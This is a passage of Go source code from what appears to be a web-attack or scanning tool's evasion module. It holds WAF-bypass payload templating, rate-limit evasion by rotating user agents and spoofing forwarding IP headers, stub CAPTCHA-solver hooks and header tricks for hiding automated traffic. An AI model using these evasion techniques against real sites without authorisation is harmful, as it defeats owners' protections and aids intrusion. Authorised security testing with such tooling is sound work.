		if wafType == "" || contains(technique.WAFTypes, wafType) || contains(technique.WAFTypes, "all") {
			filtered = append(filtered, technique)
		}
	}

	return filtered
}

// GenerateBypassPayloads creates payloads using bypass techniques
func (w *WAFBypassEngine) GenerateBypassPayloads(attackType, basePayload, wafType string) []string {
	techniques := w.GetBypassTechniques(attackType, wafType)
	var payloads []string

	for _, technique := range techniques {
		payload := strings.ReplaceAll(technique.Template, "{payload}", basePayload)
		payloads = append(payloads, payload)
	}

	return payloads
}

// Rate Limiting Evasion
type RateLimitEvasion struct {
	userAgents []string
	proxies    []string
	headers    map[string][]string
	current    int
}

func NewRateLimitEvasion() *RateLimitEvasion {
	return &RateLimitEvasion{
		userAgents: initializeUserAgents(),
		headers:    initializeHeaders(),
		current:    0,
	}
}

func initializeUserAgents() []string {
	return []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
	}
}

func initializeHeaders() map[string][]string {
	return map[string][]string{
		"Accept": {
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"application/json,text/plain,*/*",
			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		},
		"Accept-Language": {
			"en-US,en;q=0.9",
			"en-GB,en;q=0.9",
			"es-ES,es;q=0.9",
			"fr-FR,fr;q=0.9",
			"de-DE,de;q=0.9",
		},
		"Accept-Encoding": {
			"gzip, deflate, br",
			"gzip, deflate",
			"identity",
		},
		"Connection": {
			"keep-alive",
			"close",
		},
	}
}

// GetRandomUserAgent returns a random user agent
func (r *RateLimitEvasion) GetRandomUserAgent() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(r.userAgents))))
	return r.userAgents[n.Int64()]
}

// GetRandomHeaders returns random headers
func (r *RateLimitEvasion) GetRandomHeaders() map[string]string {
	headers := make(map[string]string)

	for headerName, values := range r.headers {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(values))))
		headers[headerName] = values[n.Int64()]
	}

	return headers
}

// ApplyEvasionHeaders applies evasion headers to an HTTP request
func (r *RateLimitEvasion) ApplyEvasionHeaders(req *http.Request) {
	req.Header.Set("User-Agent", r.GetRandomUserAgent())

	for key, value := range r.GetRandomHeaders() {
		req.Header.Set(key, value)
	}

	// Add additional evasion headers
	req.Header.Set("X-Forwarded-For", r.generateRandomIP())
	req.Header.Set("X-Real-IP", r.generateRandomIP())
	req.Header.Set("X-Originating-IP", r.generateRandomIP())
}

func (r *RateLimitEvasion) generateRandomIP() string {
	// Generate random private IP to avoid real IP exposure
	ranges := []string{
		"10.%d.%d.%d",
		"172.16.%d.%d",
		"192.168.%d.%d",
	}

	rangeIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ranges))))
	selectedRange := ranges[rangeIdx.Int64()]

	var octets []interface{}
	for i := 0; i < strings.Count(selectedRange, "%d"); i++ {
		octet, _ := rand.Int(rand.Reader, big.NewInt(255))
		octets = append(octets, octet.Int64())
	}

	return fmt.Sprintf(selectedRange, octets...)
}

// CAPTCHA Solver
type CaptchaSolver struct {
	provider string
	apiKey   string
	timeout  time.Duration
}

func NewCaptchaSolver(provider, apiKey string) *CaptchaSolver {
	return &CaptchaSolver{
		provider: provider,
		apiKey:   apiKey,
		timeout:  120 * time.Second,
	}
}

// SolveCaptcha attempts to solve a CAPTCHA challenge
func (c *CaptchaSolver) SolveCaptcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	if c.apiKey == "" {
		return "", fmt.Errorf("CAPTCHA solver not configured")
	}

	switch c.provider {
	case "2captcha":
		return c.solve2Captcha(ctx, captchaType, siteKey, pageURL)
	case "anticaptcha":
		return c.solveAntiCaptcha(ctx, captchaType, siteKey, pageURL)
	default:
		return "", fmt.Errorf("unsupported CAPTCHA provider: %s", c.provider)
	}
}

func (c *CaptchaSolver) solve2Captcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	// Implementation for 2captcha.com API
	// This would integrate with their HTTP API
	return "", fmt.Errorf("2captcha integration not implemented")
}

func (c *CaptchaSolver) solveAntiCaptcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	// Implementation for anti-captcha.com API
	return "", fmt.Errorf("anticaptcha integration not implemented")
}

// Stealth Engine
type StealthEngine struct {
	fingerprintResistance bool
	timingRandomization   bool
	behavioralMimicry     bool
	networkEvasion        bool
}

func NewStealthEngine() *StealthEngine {
	return &StealthEngine{
		fingerprintResistance: true,
		timingRandomization:   true,
		behavioralMimicry:     true,
		networkEvasion:        true,
	}
}

// ApplyStealthTechniques applies stealth techniques to a request
func (s *StealthEngine) ApplyStealthTechniques(req *http.Request) {
	if s.fingerprintResistance {
		s.applyFingerprintResistance(req)
	}

	if s.networkEvasion {
		s.applyNetworkEvasion(req)
	}
}

func (s *StealthEngine) applyFingerprintResistance(req *http.Request) {
	// Remove telltale headers that identify automated tools
	req.Header.Del("X-Requested-With")
	req.Header.Del("X-Forwarded-For")

	// Add realistic browser headers
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
}

func (s *StealthEngine) applyNetworkEvasion(req *http.Request) {
	// Add headers that might bypass some basic filters
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("DNT", "1")
	req.Header.Set("Sec-GPC", "1")
}

// GetRandomDelay returns a random delay for timing randomization
func (s *StealthEngine) GetRandomDelay() time.Duration {
	if !s.timingRandomization {
		return 0
	}

	// Random delay between 1-5 seconds
	max := big.NewInt(4000) // 4 seconds in milliseconds
	n, _ := rand.Int(rand.Reader, max)
	return time.Duration(n.Int64()+1000) * time.Millisecond
}

// Getter methods for accessing components
func (e *EvasionEngine) GetWAFBypass() *WAFBypassEngine {
	return e.wafBypass
}

func (e *EvasionEngine) GetRateLimiter() *RateLimitEvasion {
	return e.rateLimiter
}

func (e *EvasionEngine) GetCaptchaSolver() *CaptchaSolver {
	return e.captcha
}

func (e *EvasionEngine) GetStealth() *StealthEngine {
	return e.stealth
}

// Utility functions
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
